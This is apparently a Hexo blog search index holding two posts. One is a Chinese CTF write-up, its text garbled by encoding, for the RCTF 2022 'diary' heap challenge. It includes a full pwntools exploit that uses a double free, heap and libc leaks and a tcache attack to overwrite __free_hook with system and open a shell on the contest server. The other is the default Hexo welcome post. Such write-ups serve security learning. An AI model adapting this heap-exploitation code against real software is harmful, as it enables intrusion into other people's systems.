    
    
    
    <entry>
      <title>RCTF2022diary</title>
      <link href="/2022/12/13/RCTF2022diary/"/>
      <url>/2022/12/13/RCTF2022diary/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡RCTFæœ¬æ¥å‡†å¤‡ç»™æ ¡é˜Ÿè®¤çœŸæ‰“çš„ï¼Œç»“æœå†™äº†ä¸€é¢˜æˆ‘ä»¬å­¦æ ¡çªç„¶è¯´æ”¾å‡äº†ï¼Œæˆ‘å°±å…´å¥‹çš„æ²¡æ€ä¹ˆçœ‹äº†ã€‚</p><p>å°±çœ‹äº†diaryå’Œgameï¼Œä»¥ä¸ºgameæ˜¯ç­¾åˆ°é¢˜ï¼Œç»“æœæ˜¯éé¢„æœŸæˆ‘ä¸çŸ¥é“ã€‚çœ‹æ¥linuxéƒ¨ç½²è¿™å—å¾—å¥½å¥½å­¦å­¦ã€‚</p><p>è¦æ˜¯è·Ÿç€r3æ‰“å°±å¥½äº†ï¼Œæˆ‘å°±èƒ½æŠŠç²¾åŠ›æ”¾åœ¨é‚£å‡ é“å †é¢˜ä¸Šäº†ï¼ˆbushiï¼‰</p><p>çœ‹äº†ä¸€ä¸‹å¤§æˆ˜é˜Ÿä»¬çš„wpï¼Œè§£æ³•å¥½åƒè·Ÿæˆ‘çš„å®Œå…¨ä¸ä¸€æ ·ï¼ˆæ¯”æˆ‘çš„ç®€å•å¤šäº†ï¼‰ï¼Œå°±æ¥åˆ†äº«ä¸€ä¸‹ã€‚</p><h3 id="é¢˜ç›®å¤ç°"><a href="#é¢˜ç›®å¤ç°" class="headerlink" title="é¢˜ç›®å¤ç°"></a>é¢˜ç›®å¤ç°</h3><p>æœ¬è´¨æ˜¯ä¸ªå †é¢˜ï¼Œå¯ä»¥add,edit,deleteï¼Œæœ‰æ„æ€çš„äº‹è¿˜èƒ½encrypt,decryptï¼Œå…¶å®æˆ‘éƒ½æ²¡æŠŠé¢˜ç›®é€†å®Œã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æˆ‘ä»£ç ä¹Ÿæ€ä¹ˆä»”ç»†å®¡ï¼Œæœ¬æ¥æƒ³fuzzçš„ã€‚åæ¥è‡ªå·±éšä¾¿è¯•äº†è¯•ï¼Œåœ¨åˆ›å»ºå¤šä¸ªchunkåï¼Œå¦‚æœæˆ‘ä»¬åˆ æ‰éæœ€åä¸€ä¸ªçš„chunkå°±ä¼šå¯¼è‡´ä¸€ä¸ªdouble freeçš„æ•ˆæœã€‚</p><pre class=" language-python"><code class="language-python">sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#1#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#2#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#0'</span><span class="token punctuation">)</span></code></pre><p><img src="1.png" alt="double free"></p><p>æœ‰è¿™ä¸ªdouble freeæˆ‘ä»¬å°±åŸºæœ¬ä¸Šéšä¾¿æ‰“äº†å§ï¼Œå› ä¸ºæ˜¯0x311çš„å †å—ï¼Œlibcå’Œheapåœ°å€éƒ½æœ‰äº†</p><p>é—®é¢˜æ˜¯ç”±äºæ¯ä¸ªå †å—å‰4ä¸ªå­—èŠ‚éƒ½ä¼šè¢«ç½®ä¸º0x20ï¼Œæˆ‘ä»¬tcache attackå°±æ²¡é‚£ä¹ˆæ–¹ä¾¿äº†ã€‚</p><p>æˆ‘ç„äº†çœ¼nu1lçš„wpé‡Œæåˆ°äº†ä»€ä¹ˆencryptæ—¶å€™çš„callocå•¥çš„ï¼Œè¿™å—æˆ‘éƒ½æ²¡çœ‹ã€‚æˆ‘çš„æƒ³æ³•æ˜¯ï¼š<strong>æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½è®©å‰4ä¸ªå­—èŠ‚ï¼Œå˜æˆæˆ‘ä»¬é¢„æœŸæ‰“çš„free_hookåœ°å€?</strong></p><p>è¯•äº†ä¸‹encryptå‡½æ•°,å¯ä»¥å¯¹å‰å››å­—èŠ‚é€å­—èŠ‚åŠ å¯†ï¼Œè¿™ä¸ªåŠ å¯†æ˜¯å’Œä¸€ç³»åˆ—éšæœºå­—èŠ‚å¼‚æˆ–äº§ç”Ÿçš„ã€‚è€Œä¸”è¿™ä¸ªéšæœºåçš„å€¼æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡showæ‹¿åˆ°ï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬åªè¦é€å­—èŠ‚ä¸æ–­çˆ†ç ´ï¼Œè·å¾—é¢„æœŸå­—èŠ‚ï¼Œå°±èƒ½å¾—åˆ°free_hookåœ°å€ã€‚</strong> ä¹Ÿä¸ç”¨æŠŠç¨‹åºé€†å®Œäº†ã€‚</p><pre class=" language-python"><code class="language-python">i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span></code></pre><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>ru         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span>a<span class="token punctuation">)</span>r         <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sa         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sl        <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>s         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'119.13.105.35'</span><span class="token punctuation">,</span> <span class="token number">10111</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#elf = ELF('./pwn')</span><span class="token comment" spellcheck="true">#libc = ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'add#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#2#3#4#5#6#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'update#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'show#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'encrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'decrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak heap</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_heap'</span><span class="token punctuation">,</span> leak_heap<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">-</span>i<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f17465e4be0</span> <span class="token operator">-</span> <span class="token number">0x7f17463f8000</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span><span class="token comment" spellcheck="true"># tcache attack</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>target <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7fc9ae630e48</span> <span class="token operator">-</span><span class="token number">0x7fc9ae442000</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token number">4</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x300</span><span class="token punctuation">)</span>bruce_byte <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bruce_byte<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x30d5)')</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss rute'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>bdele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="æ¯”èµ›æ€»ç»“"><a href="#æ¯”èµ›æ€»ç»“" class="headerlink" title="æ¯”èµ›æ€»ç»“"></a>æ¯”èµ›æ€»ç»“</h3><p>å…¶å®è¿™é¢˜æˆ‘çº¯çº¯ççŒ«ç¢°æ­»è€—å­å†™çš„ï¼Œé¢˜ç›®ä¹Ÿæ²¡å®¡å®Œã€‚å¥½ä¹…æ²¡è®¤çœŸæ‰“ctfæ„Ÿè§‰è‡ªå·±ä¸“æ³¨åº¦ï¼Œä½“åŠ›å•¥çš„ä¸‹é™å¾ˆå¤§ï¼Œå­¦æ ¡ä¸€å †å±äº‹ç‰µæ‰¯äº†å¾ˆå¤šç²¾åŠ›ï¼ŒåŸæ¥è·Ÿç€r3æ‰“ä¹Ÿéƒ½æ˜¯åˆ«äººæ‰¾å®Œæ´è‡ªå·±å·é¸¡å†™ä¸ªè„šæœ¬ã€‚ä»ä»Šå¤©å¼€å§‹è¦ç—›å®šæ€ç—›ï¼ŒåŠ å¼ºæ—¶é—´ç®¡ç†ï¼Œä¸èƒ½æ‘†ä¸‹å»äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/14/hello-world/"/>
      <url>/2022/04/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
